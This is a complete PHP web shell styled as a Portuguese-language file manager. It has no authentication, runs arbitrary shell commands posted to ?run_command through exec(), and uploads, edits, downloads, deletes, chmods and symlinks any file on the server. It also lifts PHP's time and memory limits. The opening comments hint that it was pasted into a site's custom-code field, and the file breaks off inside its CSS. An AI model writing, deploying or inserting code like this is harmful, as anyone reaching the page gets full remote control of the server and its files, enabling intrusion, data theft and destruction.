<?php
// PHP code here
// Custom PHP code
?>
<?php
// --- ADICIONE ISTO NO TOPO ---
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
// -----------------------------

// Configurações iniciais
$scriptDir = dirname(__FILE__);
set_time_limit(0); // Remove o limite de tempo de execução
ini_set('memory_limit', '-1'); // Remove o limite de memória

// Função para verificar se o diretório é legível
function is_readable_dir($dir)
{
    return is_dir($dir) && is_readable($dir);
}

// Função para upload de arquivos
function upload_file($upload_dir)
{
    try {
        if (!is_readable_dir($upload_dir)) {
            throw new Exception("Diretório inacessível ou sem permissão: " . htmlspecialchars($upload_dir));
        }

        // Verifica se o formulário foi enviado e o arquivo existe no array de arquivos
        if (isset($_FILES['uploaded_file'])) {
            $file = $_FILES['uploaded_file'];
            $destination = $upload_dir . DIRECTORY_SEPARATOR . basename($file['name']);

            // Move o arquivo enviado para o diretório de destino
            if (move_uploaded_file($file['tmp_name'], $destination)) {
                echo "<div class='alert success'>Arquivo " . htmlspecialchars(basename($file['name'])) . " enviado com sucesso.</div>";
            } else {
                throw new Exception("Erro ao mover o arquivo.");
            }
        }
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Listar arquivos e diretórios (incluindo arquivos ocultos)
function list_directory($dir, $showControls = true)
{
    global $scriptDir;

    try {
        if (!is_readable_dir($dir)) {
            throw new Exception("Diretório inacessível ou sem permissão: " . htmlspecialchars($dir));
        }

        $files = @scandir($dir);
        if ($files === false) {
            throw new Exception("Erro ao ler o diretório: " . htmlspecialchars($dir));
        }

        $files = array_diff($files, array('.', '..')); // Remover '.' e '..'

        // Obter parâmetros de ordenação e filtro
        $sortBy = isset($_GET['sort']) ? $_GET['sort'] : 'date'; // Padrão: ordenar por data
        $sortOrder = isset($_GET['order']) ? $_GET['order'] : 'desc'; // Padrão: decrescente (mais recente primeiro)
        $filterName = isset($_GET['filter_name']) ? $_GET['filter_name'] : '';
        $filterType = isset($_GET['filter_type']) ? $_GET['filter_type'] : '';

        // Construir array com informações dos arquivos
        $fileData = [];
        foreach ($files as $file) {
            $filePath = realpath($dir . DIRECTORY_SEPARATOR . $file);
            if ($filePath === false)
                continue;

            $isDir = is_dir($filePath);
            $extension = $isDir ? '' : strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $size = $isDir ? 0 : @filesize($filePath);
            $mtime = @filemtime($filePath);

            $fileData[] = [
                'name' => $file,
                'path' => $filePath,
                'is_dir' => $isDir,
                'extension' => $extension,
                'size' => $size,
                'mtime' => $mtime,
                'permissions' => substr(sprintf('%o', @fileperms($filePath)), -4)
            ];
        }

        // Aplicar filtro por nome
        if (!empty($filterName)) {
            $fileData = array_filter($fileData, function ($item) use ($filterName) {
                return stripos($item['name'], $filterName) !== false;
            });
        }

        // Aplicar filtro por tipo/extensão
        if (!empty($filterType)) {
            if ($filterType === 'dir') {
                $fileData = array_filter($fileData, function ($item) {
                    return $item['is_dir'];
                });
            } elseif ($filterType === 'file') {
                $fileData = array_filter($fileData, function ($item) {
                    return !$item['is_dir'];
                });
            } else {
                $fileData = array_filter($fileData, function ($item) use ($filterType) {
                    return $item['extension'] === strtolower($filterType);
                });
            }
        }

        // Ordenar arquivos
        usort($fileData, function ($a, $b) use ($sortBy, $sortOrder) {
            // Diretórios sempre primeiro
            if ($a['is_dir'] && !$b['is_dir'])
                return -1;
            if (!$a['is_dir'] && $b['is_dir'])
                return 1;

            switch ($sortBy) {
                case 'name':
                    $cmp = strcasecmp($a['name'], $b['name']);
                    break;
                case 'size':
                    $cmp = $a['size'] <=> $b['size'];
                    break;
                case 'type':
                    $cmp = strcasecmp($a['extension'], $b['extension']);
                    if ($cmp === 0) {
                        $cmp = strcasecmp($a['name'], $b['name']);
                    }
                    break;
                case 'date':
                default:
                    // Para data, comparar usando spaceship operator
                    $cmp = $a['mtime'] <=> $b['mtime'];
                    break;
            }

            // desc = mais novo primeiro (inverte a comparação)
            return $sortOrder === 'desc' ? -$cmp : $cmp;
        });

        // Mostrar controles de navegação apenas uma vez
        if ($showControls) {
            echo "<div class='controls'>";
            echo "<a href=\"?dir=" . urlencode($scriptDir) . "\" class='btn btn-base'>Base</a>";
            echo "<a href=\"?dir=" . urlencode(dirname($dir)) . "\" class='btn btn-back'>Voltar</a>";
            echo "<a href=\"?dir=" . urlencode($dir) . "\" class='btn btn-refresh'>Atualizar</a>";
            echo "</div>";

            // Formulário de filtro e ordenação
            $currentParams = $_GET;
            unset($currentParams['filter_name'], $currentParams['filter_type'], $currentParams['sort'], $currentParams['order']);
            $baseUrl = '?' . http_build_query($currentParams);

            echo "<div class='filter-sort-container'>";
            echo "<form method='GET' class='filter-form'>";
            echo "<input type='hidden' name='dir' value='" . htmlspecialchars($dir) . "'>";

            // Filtros
            echo "<div class='filter-group'>";
            echo "<label>Filtrar por nome:</label>";
            echo "<input type='text' name='filter_name' class='input-small' value='" . htmlspecialchars($filterName) . "' placeholder='Nome do arquivo...'>";
            echo "</div>";

            echo "<div class='filter-group'>";
            echo "<label>Filtrar por tipo:</label>";
            echo "<select name='filter_type' class='input-small'>";
            echo "<option value=''" . ($filterType === '' ? " selected" : "") . ">Todos</option>";
            echo "<option value='dir'" . ($filterType === 'dir' ? " selected" : "") . ">Pastas</option>";
            echo "<option value='file'" . ($filterType === 'file' ? " selected" : "") . ">Arquivos</option>";
            echo "<option value='php'" . ($filterType === 'php' ? " selected" : "") . ">.php</option>";
            echo "<option value='js'" . ($filterType === 'js' ? " selected" : "") . ">.js</option>";
            echo "<option value='css'" . ($filterType === 'css' ? " selected" : "") . ">.css</option>";
            echo "<option value='html'" . ($filterType === 'html' ? " selected" : "") . ">.html</option>";
            echo "<option value='json'" . ($filterType === 'json' ? " selected" : "") . ">.json</option>";
            echo "<option value='txt'" . ($filterType === 'txt' ? " selected" : "") . ">.txt</option>";
            echo "<option value='zip'" . ($filterType === 'zip' ? " selected" : "") . ">.zip</option>";
            echo "<option value='pdf'" . ($filterType === 'pdf' ? " selected" : "") . ">.pdf</option>";
            echo "<option value='jpg'" . ($filterType === 'jpg' ? " selected" : "") . ">.jpg</option>";
            echo "<option value='png'" . ($filterType === 'png' ? " selected" : "") . ">.png</option>";
            echo "</select>";
            echo "</div>";

            // Ordenação
            echo "<div class='filter-group'>";
            echo "<label>Ordenar por:</label>";
            echo "<select name='sort' class='input-small'>";
            echo "<option value='date'" . ($sortBy === 'date' ? " selected" : "") . ">Data</option>";
            echo "<option value='name'" . ($sortBy === 'name' ? " selected" : "") . ">Nome</option>";
            echo "<option value='size'" . ($sortBy === 'size' ? " selected" : "") . ">Tamanho</option>";
            echo "<option value='type'" . ($sortBy === 'type' ? " selected" : "") . ">Tipo</option>";
            echo "</select>";
            echo "</div>";

            echo "<div class='filter-group'>";
            echo "<label>Ordem:</label>";
            echo "<select name='order' class='input-small'>";
            echo "<option value='desc'" . ($sortOrder === 'desc' ? " selected" : "") . ">Decrescente</option>";
            echo "<option value='asc'" . ($sortOrder === 'asc' ? " selected" : "") . ">Crescente</option>";
            echo "</select>";
            echo "</div>";

            echo "<button type='submit' class='btn btn-filter'>Aplicar</button>";
            echo "<a href='?dir=" . urlencode($dir) . "' class='btn btn-clear'>Limpar</a>";
            echo "</form>";
            echo "</div>";
        }

        echo "<div class='file-list'>";

        // Mostrar contagem de itens
        $totalItems = count($fileData);
        $dirCount = count(array_filter($fileData, function ($item) {
            return $item['is_dir'];
        }));
        $fileCount = $totalItems - $dirCount;
        echo "<div class='file-count'>Total: {$totalItems} itens ({$dirCount} pastas, {$fileCount} arquivos)</div>";

        foreach ($fileData as $fileInfo) {
            $filePath = $fileInfo['path'];
            $file = $fileInfo['name'];
            $permissions = $fileInfo['permissions'];
            $lastModified = date("d/m/Y H:i:s", $fileInfo['mtime']);
            $fileSize = $fileInfo['is_dir'] ? '' : ' - Tamanho: ' . format_file_size($fileInfo['size']);

            echo "<div class='file-item'>";
            echo "<div class='file-name'>";
            if ($fileInfo['is_dir']) {
                echo "<strong>[DIR]</strong> <a href=\"?dir=" . urlencode($filePath) . "\">$file</a>";
            } else {
                echo "<strong>[FILE]</strong> " . htmlspecialchars($file);
            }
            echo " - Permissões: $permissions - Última Modificação: $lastModified" . $fileSize;
            echo "</div>";
            echo "<div class='file-actions'>";
            if ($fileInfo['is_dir']) {
                echo "<button class='btn btn-delete' onclick=\"excluirItem('" . urlencode($filePath) . "', this)\">Excluir</button>";
                echo "<button class='btn btn-zip' onclick=\"compactarPasta('" . urlencode($filePath) . "')\">Compactar</button>";
            } else {
                echo "<a href=\"?download=" . urlencode($filePath) . "\"><button class='btn btn-download'>Download</button></a>";
                echo "<a href=\"?edit=" . urlencode($filePath) . "\"><button class='btn btn-edit'>Editar</button></a>";
                echo "<a href=\"?rename=" . urlencode($filePath) . "\"><button class='btn btn-rename'>Renomear</button></a>";
                echo "<button class='btn btn-delete' onclick=\"excluirItem('" . urlencode($filePath) . "', this)\">Excluir</button>";
            }
            echo "<a href=\"?chmod=" . urlencode($filePath) . "\"><button class='btn btn-chmod'>Permissão</button></a>";
            echo "</div>";
            echo "</div>";
        }
        echo "</div>";

        // Formulário de upload de arquivos
        echo "<div class='form-group'>";
        echo "<form method='POST' enctype='multipart/form-data' action='?upload=" . urlencode($dir) . "'>";
        echo "Selecionar arquivo: <input type='file' name='uploaded_file' class='input' required>";
        echo "<button type='submit' class='btn btn-upload'>Upload</button>";
        echo "</form>";
        echo "</div>";

        // Formulários de criação de pasta e arquivo
        echo "<div class='form-group'>";
        echo "<form method='POST' action='?create_folder=" . urlencode($dir) . "'>";
        echo "Criar nova pasta: <input type='text' name='folder_name' class='input' required>";
        echo "<button type='submit' class='btn btn-create'>Criar</button>";
        echo "</form>";

        echo "<form method='POST' action='?create_file=" . urlencode($dir) . "'>";
        echo "Criar novo arquivo: <input type='text' name='file_name' class='input' required>";
        echo "<button type='submit' class='btn btn-create'>Criar</button>";
        echo "</form>";
        echo "</div>";

    } catch (Exception $e) {
        display_error($e->getMessage(), $dir);
    }
}

// Função para formatar o tamanho do arquivo
function format_file_size($bytes)
{
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' bytes';
    }
}

// Função para exibir erros detalhados
function display_error($message, $dir)
{
    echo "<div class='alert error'>$message</div>";
    echo "<p><a href=\"?dir=" . urlencode(dirname($dir)) . "\" class='btn btn-back'>Voltar</a></p>";
}

// Função para alterar permissões de arquivos ou diretórios
function chmod_file($file, $permissions)
{
    try {
        if (chmod($file, octdec($permissions))) {
            echo "<div class='alert success'>Permissões alteradas com sucesso.</div>";
        } else {
            throw new Exception("Erro ao alterar as permissões.");
        }
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Função para criar nova pasta
function create_folder($dir, $folder_name)
{
    try {
        $new_folder = $dir . DIRECTORY_SEPARATOR . $folder_name;
        if (!file_exists($new_folder)) {
            if (mkdir($new_folder)) {
                echo "<div class='alert success'>Pasta criada com sucesso.</div>";
            } else {
                throw new Exception("Erro ao criar a pasta.");
            }
        } else {
            echo "<div class='alert warning'>A pasta já existe.</div>";
        }
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Função para criar novo arquivo
function create_file($dir, $file_name)
{
    try {
        $new_file = $dir . DIRECTORY_SEPARATOR . $file_name;
        if (!file_exists($new_file)) {
            if (file_put_contents($new_file, '') !== false) {
                echo "<div class='alert success'>Arquivo criado com sucesso.</div>";
            } else {
                throw new Exception("Erro ao criar o arquivo.");
            }
        } else {
            echo "<div class='alert warning'>O arquivo já existe.</div>";
        }
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Função para exibir o conteúdo de um arquivo para edição
function edit_file($file)
{
    try {
        $content = file_get_contents($file);
        if ($content === false) {
            throw new Exception("Erro ao ler o conteúdo do arquivo.");
        }
        echo "<h2>Editando arquivo: " . htmlspecialchars(basename($file)) . "</h2>";
        echo "<form method='POST' action='?save=" . urlencode($file) . "'>";
        echo "<textarea name='content' rows='20' cols='100' class='textarea'>" . htmlspecialchars($content) . "</textarea><br>";
        echo "<button type='submit' class='btn btn-save'>Salvar Alterações</button>";
        echo "<a href='?dir=" . urlencode(dirname($file)) . "'><button type='button' class='btn btn-back'>Voltar</button></a>";
        echo "</form>";
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Função para salvar as alterações de um arquivo
function save_file($file, $content)
{
    try {
        if (file_put_contents($file, $content) === false) {
            throw new Exception("Erro ao salvar o arquivo.");
        }
        echo "<div class='alert success'>Arquivo salvo com sucesso.</div>";
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Função para excluir um arquivo ou diretório
function delete_file($file)
{
    try {
        if (is_dir($file)) {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($file, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );

            foreach ($files as $f) {
                $realPath = $f->getRealPath();
                if ($f->isDir()) {
                    rmdir($realPath);
                } else {
                    unlink($realPath);
                }
            }
            rmdir($file);
        } else {
            unlink($file);
        }
        echo "<div class='alert success'>Arquivo ou diretório excluído com sucesso.</div>";
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Função para compactar uma pasta em ZIP
function zip_directory($source, $destination)
{
    try {
        $zip = new ZipArchive();
        if ($zip->open($destination, ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE) === TRUE) {
            $source = realpath($source);
            $folderName = basename($source); // Nome da pasta a ser usada como raiz no ZIP

            if (is_dir($source)) {
                // Adicionar a pasta raiz no ZIP
                $zip->addEmptyDir($folderName);

                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );

                foreach ($files as $file) {
                    $filePath = $file->getRealPath();
                    // Incluir o nome da pasta raiz no caminho relativo
                    $relativePath = $folderName . DIRECTORY_SEPARATOR . substr($filePath, strlen($source) + 1);

                    if ($file->isDir()) {
                        $zip->addEmptyDir($relativePath);
                    } else {
                        $zip->addFile($filePath, $relativePath);
                    }
                }
            } else if (is_file($source)) {
                $zip->addFile($source, basename($source));
            }

            $zip->close();
            $downloadUrl = "?download=" . urlencode($destination);
            echo "<div class='alert success'>Diretório compactado com sucesso! Download iniciado automaticamente.</div>";
            // Iniciar download automaticamente via JavaScript
            echo "<script>
                (function() {
                    var iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = '" . $downloadUrl . "';
                    document.body.appendChild(iframe);
                    setTimeout(function() { document.body.removeChild(iframe); }, 5000);
                })();
            </script>";
        } else {
            throw new Exception("Erro ao criar o arquivo ZIP.");
        }
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Função para renomear arquivos ou diretórios
function rename_file($old_name, $new_name)
{
    try {
        if (rename($old_name, $new_name)) {
            echo "<div class='alert success'>Renomeado com sucesso para $new_name.</div>";
        } else {
            throw new Exception("Erro ao renomear.");
        }
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Função para criar um link simbólico
function create_symlink($target, $link)
{
    try {
        if (symlink($target, $link)) {
            echo "<div class='alert success'>Link simbólico criado com sucesso.</div>";
        } else {
            throw new Exception("Erro ao criar o link simbólico.");
        }
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Função para ler metadados de arquivos
function read_metadata($file)
{
    try {
        $metadata = [
            'Tamanho' => filesize($file),
            'Última Modificação' => date("F d Y H:i:s.", filemtime($file)),
            'Último Acesso' => date("F d Y H:i:s.", fileatime($file)),
            'Criação' => date("F d Y H:i:s.", filectime($file)),
            'Tipo' => filetype($file),
            'Permissões' => substr(sprintf('%o', fileperms($file)), -4),
            'Proprietário' => fileowner($file),
            'Grupo' => filegroup($file),
        ];

        echo "<div class='metadata'><h3>Metadados do Arquivo</h3><ul>";
        foreach ($metadata as $key => $value) {
            echo "<li><strong>$key:</strong> $value</li>";
        }
        echo "</ul></div>";
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Função para executar comandos do sistema
function execute_command($command)
{
    try {
        $output = [];
        $return_var = 0;
        exec($command, $output, $return_var);
        if ($return_var !== 0) {
            throw new Exception("Erro ao executar o comando: $command");
        }
        echo "<div class='alert success'>Comando executado com sucesso: <pre>" . htmlspecialchars(implode("\n", $output)) . "</pre></div>";
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Função para criar arquivos temporários
function create_temp_file()
{
    try {
        $temp = tmpfile();
        if ($temp === false) {
            throw new Exception("Erro ao criar arquivo temporário.");
        }
        fwrite($temp, "Conteúdo temporário.");
        fseek($temp, 0);
        echo "<div class='alert success'>Arquivo temporário criado e seu conteúdo é: <pre>" . htmlspecialchars(fread($temp, 1024)) . "</pre></div>";
        fclose($temp);
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Função para manipulação de arquivos JSON
function handle_json($file, $action = 'read', $data = null)
{
    try {
        if ($action === 'read') {
            $content = file_get_contents($file);
            if ($content === false) {
                throw new Exception("Erro ao ler o arquivo JSON.");
            }
            $json = json_decode($content, true);
            echo "<div class='alert success'>Conteúdo JSON: <pre>" . htmlspecialchars(print_r($json, true)) . "</pre></div>";
        } elseif ($action === 'write' && $data !== null) {
            $json_data = json_encode($data);
            if (file_put_contents($file, $json_data) === false) {
                throw new Exception("Erro ao escrever no arquivo JSON.");
            }
            echo "<div class='alert success'>Dados JSON escritos com sucesso.</div>";
        }
    } catch (Exception $e) {
        echo "<div class='alert error'>" . $e->getMessage() . "</div>";
    }
}

// Define o caminho base a partir da pasta raiz onde deseja listar
$baseDir = realpath(isset($_GET['dir']) ? $_GET['dir'] : $scriptDir);

// Verifica se uma ação foi solicitada
if (isset($_GET['upload'])) {
    $dir = realpath($_GET['upload']);
    if (is_readable_dir($dir)) {
        upload_file($dir);
    } else {
        display_error("Erro ao acessar o diretório: $dir", $dir);
    }
} elseif (isset($_GET['download'])) {
    $file = realpath($_GET['download']);

    if (is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        header('Pragma: public');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Content-Transfer-Encoding: binary');
        header('Connection: close');

        readfile($file);
        exit;
    } else {
        echo "<div class='alert error'>Acesso negado.</div>";
    }
} elseif (isset($_GET['zip'])) {
    $dir = realpath($_GET['zip']);
    $isAjax = isset($_GET['ajax']) && $_GET['ajax'] == '1';

    if (is_readable_dir($dir)) {
        $zipFile = $dir . '.zip';

        if ($isAjax) {
            // Resposta AJAX - apenas compactar e retornar JSON
            header('Content-Type: application/json');
            try {
                $zip = new ZipArchive();
                if ($zip->open($zipFile, ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE) === TRUE) {
                    $source = realpath($dir);
                    $folderName = basename($source);

                    $zip->addEmptyDir($folderName);

                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );

                    foreach ($files as $file) {
                        $filePath = $file->getRealPath();
                        $relativePath = $folderName . DIRECTORY_SEPARATOR . substr($filePath, strlen($source) + 1);

                        if ($file->isDir()) {
                            $zip->addEmptyDir($relativePath);
                        } else {
                            $zip->addFile($filePath, $relativePath);
                        }
                    }
                    $zip->close();
                    echo json_encode(['success' => true, 'download_url' => '?download=' . urlencode($zipFile), 'filename' => basename($zipFile)]);
                } else {
                    echo json_encode(['success' => false, 'error' => 'Erro ao criar o arquivo ZIP.']);
                }
            } catch (Exception $e) {
                echo json_encode(['success' => false, 'error' => $e->getMessage()]);
            }
            exit;
        } else {
            // Comportamento normal (não AJAX)
            zip_directory($dir, $zipFile);
        }
    } else {
        if ($isAjax) {
            header('Content-Type: application/json');
            echo json_encode(['success' => false, 'error' => 'Erro ao acessar o diretório']);
            exit;
        }
        display_error("Erro ao acessar o diretório: $dir", $dir);
    }
} elseif (isset($_GET['delete'])) {
    $file = realpath($_GET['delete']);
    $isAjax = isset($_GET['ajax']) && $_GET['ajax'] == '1';

    if ($isAjax) {
        header('Content-Type: application/json');
        try {
            if ($file === false) {
                echo json_encode(['success' => false, 'error' => 'Arquivo ou diretório não encontrado.']);
                exit;
            }

            $itemName = basename($file);

            if (is_dir($file)) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($file, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                foreach ($files as $f) {
                    $realPath = $f->getRealPath();
                    if ($f->isDir()) {
                        rmdir($realPath);
                    } else {
                        unlink($realPath);
                    }
                }
                rmdir($file);
            } else {
                unlink($file);
            }
            echo json_encode(['success' => true, 'message' => 'Item "' . $itemName . '" excluído com sucesso.']);
        } catch (Exception $e) {
            echo json_encode(['success' => false, 'error' => $e->getMessage()]);
        }
        exit;
    } else {
        delete_file($file);
    }
} elseif (isset($_GET['edit'])) {
    $file = realpath($_GET['edit']);

    if (is_file($file)) {
        edit_file($file);
    } else {
        echo "<div class='alert error'>Acesso negado.</div>";
    }
} elseif (isset($_GET['save'])) {
    $file = realpath($_GET['save']);

    if (is_file($file)) {
        if (isset($_POST['content'])) {
            save_file($file, $_POST['content']);
        }
    } else {
        echo "<div class='alert error'>Acesso negado.</div>";
    }
} elseif (isset($_GET['create_folder'])) {
    $dir = realpath($_GET['create_folder']);

    if (is_readable_dir($dir)) {
        if (isset($_POST['folder_name'])) {
            create_folder($dir, $_POST['folder_name']);
        }
    } else {
        display_error("Erro ao acessar o diretório: $dir", $dir);
    }
} elseif (isset($_GET['create_file'])) {
    $dir = realpath($_GET['create_file']);

    if (is_readable_dir($dir)) {
        if (isset($_POST['file_name'])) {
            create_file($dir, $_POST['file_name']);
        }
    } else {
        display_error("Erro ao acessar o diretório: $dir", $dir);
    }
} elseif (isset($_GET['chmod'])) {
    $file = realpath($_GET['chmod']);

    if (is_file($file) || is_readable_dir($file)) {
        echo "<h2>Alterar Permissões: " . htmlspecialchars($file) . "</h2>";
        echo "<form method='POST' action='?change_perm=" . urlencode($file) . "'>";
        echo "Permissões (Ex: 0755): <input type='text' name='permissions' class='input' required><br>";
        echo "<button type='submit' class='btn btn-chmod'>Alterar Permissões</button>";
        echo "<a href='?dir=" . urlencode(dirname($file)) . "'><button type='button' class='btn btn-back'>Voltar</button></a>";
        echo "</form>";
    } else {
        display_error("Erro ao acessar o arquivo/diretório: $file", $file);
    }
} elseif (isset($_GET['change_perm'])) {
    $file = realpath($_GET['change_perm']);

    if (is_file($file) || is_readable_dir($file)) {
        if (isset($_POST['permissions'])) {
            chmod_file($file, $_POST['permissions']);
        }
    } else {
        display_error("Erro ao acessar o arquivo/diretório: $file", $file);
    }
} elseif (isset($_GET['rename'])) {
    $file = realpath($_GET['rename']);

    if (is_file($file) || is_readable_dir($file)) {
        echo "<h2>Renomear: " . htmlspecialchars($file) . "</h2>";
        echo "<form method='POST' action='?do_rename=" . urlencode($file) . "'>";
        echo "Novo Nome: <input type='text' name='new_name' class='input' required><br>";
        echo "<button type='submit' class='btn btn-rename'>Renomear</button>";
        echo "<a href='?dir=" . urlencode(dirname($file)) . "'><button type='button' class='btn btn-back'>Voltar</button></a>";
        echo "</form>";
    } else {
        display_error("Erro ao acessar o arquivo/diretório: $file", $file);
    }
} elseif (isset($_GET['do_rename'])) {
    $old_name = realpath($_GET['do_rename']);
    $dir = dirname($old_name);
    $new_name = $dir . DIRECTORY_SEPARATOR . $_POST['new_name'];
    rename_file($old_name, $new_name);
} elseif (isset($_GET['dir'])) {
    $dir = realpath($_GET['dir']);

    if (is_readable_dir($dir)) {
        echo "<h2>Navegar: " . htmlspecialchars($dir) . "</h2>";
        // Controles já são renderizados dentro da função list_directory
        list_directory($dir, true);
    } else {
        display_error("Erro ao ler o diretório: " . htmlspecialchars($dir), $dir);
    }
} elseif (isset($_GET['symlink'])) {
    echo "<h2>Criar Link Simbólico</h2>";
    echo "<form method='POST' action='?create_symlink'>";
    echo "Alvo: <input type='text' name='target' class='input' required><br>";
    echo "Link: <input type='text' name='link' class='input' required><br>";
    echo "<button type='submit' class='btn btn-create'>Criar Link Simbólico</button>";
    echo "</form>";
} elseif (isset($_GET['create_symlink'])) {
    if (isset($_POST['target']) && isset($_POST['link'])) {
        create_symlink($_POST['target'], $_POST['link']);
    } else {
        display_error("Erro ao criar link simbólico.", $scriptDir);
    }
} elseif (isset($_GET['metadata'])) {
    $file = realpath($_GET['metadata']);
    if (is_file($file) || is_readable_dir($file)) {
        read_metadata($file);
    } else {
        display_error("Erro ao acessar o arquivo/diretório: $file", $file);
    }
} elseif (isset($_GET['command'])) {
    echo "<h2>Executar Comando</h2>";
    echo "<form method='POST' action='?run_command'>";
    echo "Comando: <input type='text' name='command' class='input' required><br>";
    echo "<button type='submit' class='btn btn-create'>Executar</button>";
    echo "</form>";
} elseif (isset($_GET['run_command'])) {
    if (isset($_POST['command'])) {
        execute_command($_POST['command']);
    } else {
        display_error("Erro ao executar o comando.", $scriptDir);
    }
} elseif (isset($_GET['temp_file'])) {
    create_temp_file();
} elseif (isset($_GET['handle_json'])) {
    $file = realpath($_GET['handle_json']);
    if (is_file($file)) {
        if (isset($_POST['json_action'])) {
            $action = $_POST['json_action'];
            $data = isset($_POST['json_data']) ? json_decode($_POST['json_data'], true) : null;
            handle_json($file, $action, $data);
        } else {
            echo "<h2>Manipular JSON</h2>";
            echo "<form method='POST' action='?handle_json=" . urlencode($file) . "'>";
            echo "Ação: <select name='json_action' class='input'>";
            echo "<option value='read'>Ler</option>";
            echo "<option value='write'>Escrever</option>";
            echo "</select><br>";
            echo "Dados JSON (somente para escrever): <textarea name='json_data' class='textarea'></textarea><br>";
            echo "<button type='submit' class='btn btn-save'>Executar</button>";
            echo "</form>";
        }
    } else {
        display_error("Erro ao acessar o arquivo JSON.", $scriptDir);
    }
} else {
    echo "<h2>Navegar e Selecionar Arquivo ou Pasta</h2>";
    // O botão Base já está incluído dentro de list_directory
    list_directory($baseDir, true);
}

?>

<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f4f4f4;
        padding: 20px;
    }

    h2 {
        color: #333;
    }

    .controls {
        display: flex;
        justify-content: flex-start;
        gap: 10px;
        margin-bottom: 20px;
    }

    .file-list {
        margin-bottom: 20px;
    }

    .file-item {
        background-color: #fff;
        margin: 5px 0;
        padding: 10px;
        border-radius: 5px;
        box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    .file-name {
        flex: 1;
        margin-right: 10px;
    }

    .file-actions {
        display: flex;
        gap: 5px;
    }

    .file-item a {
        color: #007bff;
        text-decoration: none;
    }

    .file-item a:hover {
        text-decoration: underline;
    }

    .form-group {
        display: flex;
        gap: 10px;
        margin-bottom: 20px;
    }

    .input {
        padding: 5px;
        width: calc(100% - 100px);
        margin-right: 10px;
    }

    .btn {
        padding: 5px 10px;
        background-color: #007bff;
        color: #fff;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.3s;
    }

    .btn:hover {
        background-color: #0056b3;
    }

    .btn-back {
        background-color: #6c757d;
    }

    .btn-back:hover {
        background-color: #5a6268;
    }

    .btn-zip {
        background-color: #ffc107;
    }

    .btn-zip:hover {
        background-color: #e0a800;
    }

    .btn-create {
        background-color: #28a745;
    }

    .btn-create:hover {
        background-color: #218838;
    }

    .btn-edit {
        background-color: #17a2b8;
    }

    .btn-edit:hover {
        background-color: #138496;
    }

    .btn-delete {
        background-color: #dc3545;
    }

    .btn-delete:hover {
        background-color: #c82333;
    }

    .btn-save {
        background-color: #28a745;
    }

    .btn-save:hover {
        background-color: #218838;
    }

    .btn-chmod {
        background-color: #17a2b8;
    }

    .btn-chmod:hover {
        background-color: #138496;
    }

    .btn-rename {
        background-color: #ffc107;
    }

    .btn-rename:hover {
        background-color: #e0a800;
    }

    .btn-refresh {
        background-color: #007bff;
    }

    .btn-refresh:hover {
        background-color: #0056b3;
    }

    .btn-upload {
        background-color: #007bff;
    }

    .btn-upload:hover {
        background-color: #0056b3;
    }

    .alert {
        padding: 10px;
        border-radius: 5px;
        margin-bottom: 20px;
    }

    .alert.success {
        background-color: #d4edda;
        color: #155724;
    }

    .alert.error {
        background-color: #f8d7da;
        color: #721c24;
    }

    .alert.warning {
        background-color: #fff3cd;
        color: #856404;
    }

    .textarea {
        width: 100%;
        padding: 10px;
        border-radius: 5px;
        border: 1px solid #ccc;
        font-family: monospace;
    }

    .metadata {
        background-color: #f8f9fa;
        padding: 15px;
        border-radius: 5px;
        margin-top: 20px;
    }

    .metadata ul {
        list-style-type: none;
        padding-left: 0;
    }

    .metadata li {
        padding: 5px 0;
        border-bottom: 1px solid #ddd;
    }

    .metadata li:last-child {
        border-bottom: none;
    }

    .btn-base {
        background-color: #6f42c1;
    }

    .btn-base:hover {
        background-color: #5a32a3;
    }

    .btn-filter {
        background-color: #28a745;
    }

    .btn-filter:hover {
